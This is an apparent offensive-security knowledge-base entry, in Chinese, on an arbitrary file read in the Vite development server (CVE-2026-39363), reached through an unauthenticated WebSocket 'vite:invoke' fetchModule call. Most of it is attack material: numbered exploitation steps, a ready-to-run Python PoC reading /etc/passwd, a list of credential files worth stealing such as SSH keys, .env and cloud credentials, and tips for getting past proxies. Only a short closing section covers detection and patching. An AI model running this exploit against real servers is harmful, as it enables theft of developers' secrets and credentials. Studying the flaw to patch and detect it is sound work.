---
id: web-generic-websocket-vite-invoke-fetchmodule-file-read
title: Vite 开发服务器 WebSocket 免 Origin 免 Token 调用 fetchModule 任意文件读取（CVE-2026-39363）
type: scenario
domain: web
path: web/generic/websocket
technique: vite-ws-invoke-fetchmodule-file-read
tags:
- javascript
- vite
- nodejs
- dev-server
- websocket
- auth-bypass
- arbitrary-file-read
- rpc
- cve-2026-39363
cve:
- CVE-2026-39363
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: Vite <6.4.2、<7.3.2、<8.0.5（原文：6.0.0 到 6.4.2、7.3.2 和 8.0.5 之前的版本）
verification:
  verified_by: verifier-V39
  verified_at: '2026-11-05T06:28:54+08:00'
  notes: 已对照原文7张图核对：GitHub CNA 公告版本范围与描述（图01）、Burp 发送 vite:invoke/fetchModule/file:///etc/passwd?raw（图02）、响应 data.result.code 为 export default 包裹的 /etc/passwd 内容（图03）、shouldHandle 无 Origin 直接 return true（图04）、wss connection 消息分发无 ACL（图05）、listenerForInvokeHandler 与 handleInvoke 按 name 索引执行（图06）、setInvokeHandler fetchModule 参数透传（图07）；affected_versions 按原文 6.4.2/7.3.2/8.0.5 修复版本保留。未验证点：PoC 未本机复跑；options.allowId 缺失与 assetPlugin ?raw 直读为原文源码分析结论，无独立对照实验；frontmatter 无 sources/source_url。
url: /docs/web/generic/websocket/web-generic-websocket-vite-invoke-fetchmodule-file-read/
draft: false
kb_aliases:
- CVE-2026-39363
- Vite 任意文件读取
- vite:invoke 未授权调用
- fetchModule file:// raw
- Vite dev server WebSocket 认证绕过
---

## 一句话结论

Vite 开发服务器的 WebSocket 在连接不带 `Origin` 头时不做 token 校验，攻击者可直接发送自定义 `vite:invoke` 事件调用 `fetchModule`，用 `file:///任意路径?raw`（或 `?inline`）让 `assetPlugin` 以 Vite 进程权限读取文件并作为 `export default "..."` 返回，完全绕过 `server.fs.allow` 的 HTTP 访问控制。

## 原理

- Vite 的 HMR WebSocket 入口 `shouldHandle()` 按如下逻辑鉴权：请求带 `Origin` 头时检查 token；**不带 `Origin` 时直接返回 true**（源码注释称这是为了允许非浏览器客户端免 token 连接）。浏览器总会带 `Origin`，但任何非浏览器 WebSocket 客户端都可以省略它，因此形成认证绕过。
- WebSocket 建立后，`wss.on('connection')` 对每条消息做 JSON 解析：只要 `type === 'custom'` 且 `event` 在 `customListeners` 中注册过，就调用 `listener(parsed.data, client, parsed.invoke)`，没有沙箱、没有 ACL、没有调用者身份校验。
- HMR 把 `vite:invoke` 注册给 `listenerForInvokeHandler`；后者调用 `handleInvoke`，按 `payload.name` 从 `invokeHandlers` 取函数并直接执行。`fetchModule` handler 的实现就是 `return this.fetchModule(id, importer, options)`，参数原样透传。
- 正常 HTTP 转换流程中，带 `?raw`/`?inline` 的 URL 会经过 `checkLoadingAccess`（检查 `server.fs.allow`）。但 WebSocket 的 `fetchModule` 调用 `environment.transformRequest(url)` 时没有传 `options.allowId`，`transformRequest` 内的 `if (options.allowId && !options.allowId(id))` 检查被跳过。
- 更关键的是 `?raw` 会在 `pluginContainer.load(id)` 阶段命中 `assetPlugin`：`rawRE.test(id)` 为真时，它用 `checkPublicFile(id, config) || cleanUrl(id)` 得到文件路径并直接 `fsp.readFile(file, 'utf-8')`，把内容包成 `export default ${JSON.stringify(content)}` 返回。插件提前返回了代码，后续 `transformRequest` 里的 `isFileLoadingAllowed` 检查根本没有机会执行。
- 最终效果：攻击者获得 Vite 进程可读的任意文件内容，响应中的 `data.result.code` 就是 `export default "...文件内容..."`，去掉 JS 字符串包装即可还原。

## 触发条件

- 目标运行存在漏洞的 Vite 开发服务器：版本低于 6.4.2、7.3.2、8.0.5（原文标记），且通过 `--host` 或 `server.host` 暴露到攻击者可达的网络。
- WebSocket 升级请求可以不带 `Origin` 头（使用原始 WS 客户端；浏览器自动带 Origin，因此不受影响）。
- 目标文件对 Vite/Node 进程可读，通常是开发者本机文件、源码、`.env`、SSH 密钥、云凭据等。
- 中间代理没有强制注入 `Origin` 或额外鉴权；若代理补了 Origin 且 token 校验有效，则这条绕过不成立。

## 利用步骤

1. 确认 5173 端口（或自定义端口）开放且为 Vite dev server；访问首页通常能看到 Vite 页面。
2. 用不带 `Origin` 的 WebSocket 客户端连接 `ws://target:5173/`（Burp 的 WebSockets history/Repeater 或 `websocket-client` 的 `suppress_origin=True`）。
3. 发送 `vite:invoke` 消息：
   ```json
   {"type":"custom","event":"vite:invoke","data":{"name":"fetchModule","id":"send:1","data":["file:///etc/passwd?raw"]}}
   ```
4. 从响应 `data.result.code` 中取出 `export default "..."`，反转义 JSON 字符串得到文件内容。
5. 替换 `file://` 后的路径读取其他文件；`?raw` 与 `?inline` 均可触发 assetPlugin 的直接读取。
6. 常见目标：`/etc/passwd`、应用 `.env`、`config/*.json`、`~/.ssh/id_rsa`、`/proc/self/environ`、云凭据文件。

## PoC

```python
import json, websocket

ws = websocket.create_connection("ws://target:5173/", suppress_origin=True)
ws.send(json.dumps({
    "type": "custom",
    "event": "vite:invoke",
    "data": {"name": "fetchModule", "id": "send:1", "data": ["file:///etc/passwd?raw"]},
}))
resp = json.loads(ws.recv())
code = resp["data"]["result"]["code"]          # export default "..."
content = json.loads(code[len("export default "):])  # 还原文件内容
print(content)
ws.close()
```

```text
# 原始响应结构示意
{"type":"custom","event":"vite:invoke","data":{
  "name":"fetchModule","id":"response:1",
  "result":{"code":"export default \"root:x:0:0:root:/root:/bin/bash\\n...\""}}}
```

## 变体与关联

- 变体：`?inline` 同样进入 assetPlugin 的直接读取分支；不同 Vite 版本的 `fetchModule` handler 名称与参数结构可能略有差异，但 `vite:invoke` 的免鉴权调用面一致。
- 变体：除 `fetchModule` 外，`invokeHandlers` 中注册的其他 RPC 方法同样可被未授权调用；危害取决于方法能力。
- 变体：若 Vite 前面有反向代理且代理会补 `Origin`，可尝试寻找代理透传/覆写头的方式；若代理不补，直接用原始 WS 客户端即可。
- 关联：[[web-nodejs-postcss-sourcemappingurl-arbitrary-file-read]]（另一类 Node.js 开发工具任意文件读取）；[[web-generic-file-inclusion-multilayer-symlink-realpath-bypass]]（文件读取/路径校验绕过思路对比）。
- 边界：浏览器发起的 WebSocket 一定带 Origin，无法直接利用；必须是非浏览器客户端或能控制 Origin 缺失的代理链。目标升级到修复版本后 `shouldHandle` 与 `fetchModule` 路径已加校验。

## 检测与防御

- 检测：Vite 端口（默认 5173）暴露在非受信网络；WebSocket 升级请求缺少 `Origin` 头；WS 消息中出现 `vite:invoke`、`fetchModule`、`file://`、`?raw`/`?inline` 组合；Node 进程异常读取 `/etc/passwd`、`.env`、`.ssh` 等敏感路径（auditd/eBPF/EDR）。
- 修复：升级 Vite 到 `>=6.4.2`、`>=7.3.2`、`>=8.0.5`（原文修复版本）。
- 加固：开发服务器只监听 `127.0.0.1`，不要用 `--host 0.0.0.0` 暴露到公网；必须远程访问时加反向代理鉴权并强制注入/校验 `Origin`；配置 `server.fs.strict` 与最小化 `server.fs.allow` 作为纵深防御（注意修复前该配置不覆盖 WS 路径）；不要在开发机上保存生产凭据。
